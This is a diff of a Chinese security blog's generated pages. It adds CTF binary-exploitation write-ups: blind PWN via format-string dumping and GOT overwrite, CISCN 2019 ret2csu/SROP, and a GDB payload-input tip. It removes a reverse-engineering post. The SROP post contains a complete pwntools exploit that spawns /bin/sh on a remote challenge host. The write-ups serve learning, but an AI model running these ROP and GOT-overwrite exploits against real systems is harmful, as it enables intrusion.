class="string">&quot;dump length is: &quot;</span>, <span class="built_in">len</span>(res))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dump_file&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(res)</span><br><span class="line"></span><br><span class="line">dump()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>  如下截图所示，是利用上述脚本得到的二进制程序，并在IDA中进行了符号还原，脚本可以多跑几遍，以求获得最好的效果。函数符号还原，这个就靠对函数本身的熟悉程序以及结合远程回显来猜测。</p>
+<p><img src="/../images/pwn%E7%9B%B2%E6%89%93/c46da2148dee489dbbcf6895173f75e5.png" alt="c46da2148dee489dbbcf6895173f75e5"><br>  这里如果我们可以找到<code>.start</code>的起始地址为<code>0x8048500</code>（直接泄露栈上数据或者根据上面dump出的二进制文件），那么将脚本中的b_addr改为该起始地址，可以得到更清晰的二进制程序，如下截图所示（IDA分析时设置loading offset为0x8048500)。</p>
+<p>!<img src="/../images/pwn%E7%9B%B2%E6%89%93/79f80c5238374d2eb1433da479fffac8.png" alt="79f80c5238374d2eb1433da479fffac8"><br>  经过上面的折腾，我们已经获得了主要的程序逻辑，当然最重要的是获得以下信息：函数的got表信息。如果是从<code>.start</code>地址开始泄露的话，就只有先通过plt表然后进一步获得got表，plt表的信息就是MEMORY中括号里的内容。当然细心的读者会发现，setbuf函数处对应的是标准输入和输出，我们也可以直接利用这个信息，和got表一样可以获取到libc地址。<br>  如下截图所示，<img src="/../images/pwn%E7%9B%B2%E6%89%93/3d7bb503a8ca465e8459d7f0d8a8f12a.png" alt="3d7bb503a8ca465e8459d7f0d8a8f12a">利用的是从基址泄露的二进制文件，点进去printf函数，然后直接看汇编，可以发现跳转到<code>0x804a014</code>这个地址，这个地址就是printf函数的got地址。</p>
+<p>  至此，用来进行漏洞利用的信息以全都具备，直接上wp，思路就是利用printf_got得到libc地址，然后这里修改strlen_got地址为system（获取got地址的方式和printf一样)，因为在输入&#x2F;bin&#x2F;sh字符串之前还调用一次printf，所以这里利用strlen来得到shell。但其实这里仍然有个问题，我们并不知道二进制程序是否开了RELRO保护，当然只能认为是没有全部开启的，即got表还是可以修改的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/25/srop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/25/srop/" class="post-title-link" itemprop="url">srop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-25 21:44:15 / 修改时间：21:48:12" itemprop="dateCreated datePublished" datetime="2023-08-25T21:44:15+08:00">2023-08-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CISCN-2019华南-PWN3"><a href="#CISCN-2019华南-PWN3" class="headerlink" title="CISCN 2019华南 PWN3"></a>CISCN 2019华南 PWN3</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h5 id="vuln函数"><a href="#vuln函数" class="headerlink" title="vuln函数"></a>vuln函数</h5><p><img src="/../images/srop/image-20230825214602232.png" alt="image-20230825214602232"></p>
+<p><img src="/../images/srop/image-20230825214644922.png" alt="image-20230825214644922"></p>
+<h5 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h5><p><img src="/../images/srop/image-20230825214804758.png" alt="image-20230825214804758"></p>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p><strong>这题有两种解法</strong></p>
+<ul>
+<li><strong>csu</strong></li>
+<li><strong>srop</strong></li>
+</ul>
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><blockquote>
+<p><strong>.text:00000000004004E2 mov rax, 3Bh ; ‘;’</strong><br><strong>.text:00000000004004E9 retn</strong></p>
+</blockquote>
+<p><strong>程序中白给了一段gadgets，0x3b刚好对应execve，我们就可以调用它，然后通过rop构造另外三个参数</strong></p>
+<p><strong><code>/bin/sh,0,0</code>分别对应<code>rdi, rsi, rdx</code></strong></p>
+<h2 id="leak-addr"><a href="#leak-addr" class="headerlink" title="leak addr"></a>leak addr</h2><p><strong>首先我们通过<code>sys_read</code>读入字符串，但是我们不知道其位置，只知道是在栈上，于是我们就要泄漏栈地址并且拿到字符串输入的地址</strong></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/hzpdmm.jpg"><img src="/../images/srop/hzpdmm.jpg" alt="img"></a></p>
+<p><strong>这里我们可以通过gdb可以发现，我们输入的地址距离栈基址的偏移是固定的0x118</strong></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/bzhrzq.jpg"><img src="/../images/srop/bzhrzq.jpg" alt="img"></a></p>
+<p><strong>write打印出0x30个字节，可以看出从低地址开始打印0x20个字节后0x8就是栈基址，所以我们构造</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = b&#x27;/bin/sh\x00&#x27; + b&#x27;b&#x27; * 8 + p64(vul_addr)</span><br><span class="line">sd(payload1)</span><br><span class="line">rv(0x20)</span><br><span class="line">bin_sh = u64(rv(8)) - 0x118</span><br><span class="line">ms(&#x27;bin_sh&#x27;, bin_sh)</span><br></pre></td></tr></table></figure>
+
+<p><strong>来泄漏出输入&#x2F;bin&#x2F;sh的地址，并且返回到vul函数，进行再一次的利用</strong></p>
+<h2 id="csu"><a href="#csu" class="headerlink" title="csu"></a>csu</h2><p><strong>之后就是打csu的部分了，这里可以去wiki上学习下或者参考其他师傅的wp</strong></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><strong>exp</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_s_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_s_3&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29397</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : io.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : io.send(s)</span><br><span class="line">rv = <span class="keyword">lambda</span> n : io.recv(n)</span><br><span class="line">rc = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> s : io.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ms</span>(<span class="params">name,addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(name + <span class="string">&quot;----&gt;&quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">mallocr,PIE=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+mallocr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(mallocr)))</span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x0000000004004ED</span></span><br><span class="line">pop6_ret = <span class="number">0x00000000040059A</span></span><br><span class="line">mov3_call = <span class="number">0x0000000000400580</span></span><br><span class="line">execve_call = <span class="number">0x00000000004004E2</span></span><br><span class="line">sys_call = <span class="number">0x0000000000400517</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(vul_addr)</span><br><span class="line">sd(payload1)</span><br><span class="line">rv(<span class="number">0x20</span>)</span><br><span class="line">bin_sh = u64(rv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">ms(<span class="string">&#x27;bin_sh&#x27;</span>, bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># csu</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(pop6_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(bin_sh+<span class="number">0x50</span>) + p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload2 += p64(mov3_call) + p64(execve_call)</span><br><span class="line">payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)</span><br><span class="line">sd(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a><strong>signal机制</strong></h2><p><a target="_blank" rel="noopener" href="https://p.ipic.vip/epor0p.png"><img src="/../images/srop/epor0p.png" alt="Process of Signal Handlering"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p.ipic.vip/epor0p.png">Process of Signal Handlering</a></p>
+<ol>
+<li>用户进程接到一个signal，将控制权给到内核层</li>
+<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及signal信息和sigreturn的系统调用地址</strong>，之后跳转到注册过的 signal handler 中处理相应的 signal</li>
+<li>执行完signal handler，就跳转到内核层</li>
+<li><strong>内核恢复2中保存的进程上下文，并把控制权给到用户层</strong></li>
+</ol>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p><strong>我们可以在恢复进程上下文的时候，构造一个fake_SigFrame，就能控制寄存器来劫持程序流程</strong></p>
+<p><strong>对于ctf题pwntools里是集成了框架,如上题</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sigreturn = 0x00000000004004DA</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = 59</span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = 0</span><br><span class="line">frame.rip = sys_call</span><br><span class="line">payload2 = b&#x27;/bin/sh\x00&#x27; + p64(0) + p64(sigreturn) + p64(sys_call) + bytes(frame)</span><br><span class="line">sd(payload2)</span><br></pre></td></tr></table></figure>
+
+<p><strong>只需要改payload2那一部分，要注意指定<code>context.arch = &quot;amd64&quot;</code></strong></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/14/gdb%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/14/gdb%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5/" class="post-title-link" itemprop="url">gdb文件输入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-14 17:22:41 / 修改时间：17:23:36" itemprop="dateCreated datePublished" datetime="2023-08-14T17:22:41+08:00">2023-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="GDB本地调试"><a href="#GDB本地调试" class="headerlink" title="GDB本地调试"></a>GDB本地调试</h2><p>为了弄清楚究竟是什么原因导致本地环境无法打通，最好的方式就是使用 <strong>GDB</strong> 调试。</p>
+<p>但这时出现了一个问题：payload中包含许多不可见字符，在使用 <strong>GDB</strong> 调试程序时，该如何将这些字符输入进去呢？</p>
+<p>这里我给出一个方法——我们可以将payload以字节序列的形式写入文件，在使用GDB调试时以该文件作为输入。这样一来，我们就成功地将payload输入到了目标程序中。</p>
+<p>需要注意的是，这一方法和 <strong>pwntools</strong> 提供的输入方法（如 <strong>sendline()</strong> 等）还存在一些微妙的差异，使得某些情况下使用 <strong>pwntools</strong> 输入payload能够打通，使用读取文件的方法却无法打通。因此，这一方法仅可用于调试分析。</p>
+<p>首先，我们用以下代码将payload写入文件 <strong>input.dat</strong> 中：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">system_addr=<span class="number">0x400596</span></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*(<span class="number">0x88</span>)+p64(system_addr)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./input.dat&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(payload)</span><br></pre></td></tr></table></figure>
+
+<p>随后，我们进入GDB，在main函数处打上断点，并在运行时输入：</p>
+<blockquote>
+<p>r &lt; input.dat</p>
+</blockquote>
+<p>这一命令的含义是：以 <strong>input.dat</strong> 为输入运行程序。如下图所示：</p>
+<p><img src="/../images/gdb%E6%96%87%E4%BB%B6%E8%BE%93%E5%85%A5/v2-a1cccb00850c87e2fc0254185a61cc77_720w.webp" alt="img"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -342,7 +841,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/note-service2/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/heap2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Dvgd.jpg">
@@ -356,7 +855,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/07/31/note-service2/" class="post-title-link" itemprop="url">note-service2</a>
+            <a href="/2023/07/31/heap2/" class="post-title-link" itemprop="url">note-service2</a>
         </h2>
 
         <div class="post-meta">
@@ -649,551 +1148,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/assemb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/31/assemb/" class="post-title-link" itemprop="url">assemb</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-31 09:30:37 / 修改时间：09:33:11" itemprop="dateCreated datePublished" datetime="2023-07-31T09:30:37+08:00">2023-07-31</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="rax-eax-ax-ah-al-关系"><a href="#rax-eax-ax-ah-al-关系" class="headerlink" title="rax,eax,ax,ah,al 关系"></a>rax,eax,ax,ah,al 关系</h1><p>rax,eax,ax,ah,al其实是表示同一个寄存器，只是包含不同的范围</p>
-<blockquote>
-<p>|63..32|31..16|15..8|7..0|<br>                          |AH…|AL..|<br>                          |AX…………|<br>             |EAX…………………..|<br>|RAX……………………………..|</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/26/c-%E9%80%86%E5%90%91/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/26/c-%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">c++逆向</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-26 10:13:22 / 修改时间：10:14:24" itemprop="dateCreated datePublished" datetime="2023-07-26T10:13:22+08:00">2023-07-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="攻防世界逆向高手题之re2-cpp-is-awesome"><a href="#攻防世界逆向高手题之re2-cpp-is-awesome" class="headerlink" title="攻防世界逆向高手题之re2-cpp-is-awesome"></a>攻防世界逆向高手题之re2-cpp-is-awesome</h1><p>继续开启<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%85%A8%E6%A0%88&spm=1001.2101.3001.7020">全栈</a>梦想之逆向之旅~<br>这题是攻防世界逆向高手题的re2-cpp-is-awesome<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述">载附件，照例扔入exeinfope中查看信息：<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_17,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br>64位ELF文件，无壳，运行一下查看主要显示字符串：<br><img src="/../images/c-%E9%80%86%E5%90%91/7a36fa9dbc59413d91e40a29bdd0629e.png" alt="在这里插入图片描述"></p>
-<p>照例扔入IDA中查看<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%BC%AA%E4%BB%A3%E7%A0%81&spm=1001.2101.3001.7020">伪代码</a>，有main函数看main函数：</p>
-<p>C++面向对象的代码有点乱，也有点杂，在string中追踪Better luck next time字符串跟踪出在下图的第一个红框处：<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195892.png" alt="在这里插入图片描述"><br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195893.png" alt="在这里插入图片描述"></p>
-<p>C++代码比较陌生，但是根据前面做题中积累的经验中在长类名静态调用的最后一个是要使用的函数名，比如std::__cxx11::basic_string&lt;char,std::char_traits,std::allocator&gt;::begin调用的就是begin这个函数。</p>
-<p>所以开始分析：(这里积累第一个经验)<br>第一个红框中把用户命令行输入的a2赋值给了v3。<br>第二个红框用的是cout函数，输出Usage这个字符串。<br>第三个红框不明觉厉。<br>第四个红框allocator(&amp;v13, a2, a3);应该是把a2的内容赋值给了v13。<br>第五个红框basic_string(v12, a2[1], &amp;v13);应该是把v13赋值给了V12。<br>第六、七个红框应该是v11取v12字符串的开头begin(v12)。<br>第八、九个红框应该是v14取v12的结尾end(v12)。<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195894.png" alt="在这里插入图片描述"><br>接着往下分析：<br>先看这里分析跳出循环的条件，一开始我也不知道v14是字符串的结尾，所以很被动，现在知道了。</p>
-<p>(这里积累第二个经验)<br>这里第一个红框sub_400D3D函数是取v11和v14比较，v14前面说过取输入字符串最后一个字符，而v11在第二个红框中sub_400D7A(v11)是向后取v11一个字符，所以这个if是判断当前字符是否为输入的最后一个字符，如果是就跳出循环。<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195905.png" alt="在这里插入图片描述"><br><img src="/../images/c-%E9%80%86%E5%90%91/13c4de57a8cc47f7ad03b0f567d69bb7.png" alt="在这里插入图片描述"><br><img src="/../images/c-%E9%80%86%E5%90%91/6f1cc188e2834aaa9f5a0ba3909ebf58.png" alt="在这里插入图片描述"></p>
-<p>继续往下走：<br>第一个红框是v9取v11当前的字符。<br>第二个红框是用v9和两个嵌套数组off_6020A0[dword_6020C0[v15]]作比较，dword_6020C0[v15]作为off_6020A0的下标取字符。<br>第三个红框是v5的递增操作。<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195906.png" alt="在这里插入图片描述"></p>
-<p>所以逻辑很明显了，逆向数组即可先找到off_6020A0数组：<br><img src="/../images/c-%E9%80%86%E5%90%91/ef083f52059d459bab571b5db04770f4.png" alt="在这里插入图片描述"><br>然后打印dword_6020C0数组：</p>
-<p>(这里积累第三个经验)<br>这里有个align 8，align num是让后面的字节都对齐num，也就是这里都对齐8才对，中间补7个0。可是这里下一个数和上一个数明明间隔4而已！后来查了很多资料才发现是IDA自动把多个0判断成对齐操作了，这里align 8是因为前面dd 24h中本来是db 24 0 0 0 然后后面一个双字是dd 0 也就是db 0 0 0 0，IDA把这连着的7个0当成了间隔，那上一个数和下一个数间隔就是8了，所以IDA生成了align 8。我们只要鼠标右键undefine或把上面的dd 24改一下数据大小即可重定义align 8，重新生成数据了。(前面的align 20h 也是同样的道理)<br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_18,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"><br><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_13,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述"></p>
-<p>然后开始嵌入python脚本dump下数组内容</p>
-<p>(这里积累第四个经验)<br>IDA库函数Dword是以当前地址向后四个作为Dword数据，所以我们地址要addr+4*i来保持4的间隔。(0x60213c-0x6020c0)&gt;&gt;2是因为地址之间以4为一个单位，&gt;&gt;2在前面博客中总结过就是除4且保留整数部分。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addr=<span class="number">0x6020c0</span></span><br><span class="line">list1=[]</span><br><span class="line"><span class="keyword">for</span> i in range((<span class="number">0x60213c</span><span class="number">-0x6020c0</span>)&gt;&gt;<span class="number">2</span>):</span><br><span class="line">    list1.append(Dword(addr+<span class="number">4</span>*i))</span><br><span class="line">print(list1)</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/c-%E9%80%86%E5%90%91/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5rKQ5LiA5LiA5rKQ77yM5LiA5rKQ5rKQ5LiA,size_20,color_FFFFFF,t_70,g_se,x_16-16903376195907.png" alt="在这里插入图片描述"></p>
-<p>逆向逻辑脚本：</p>
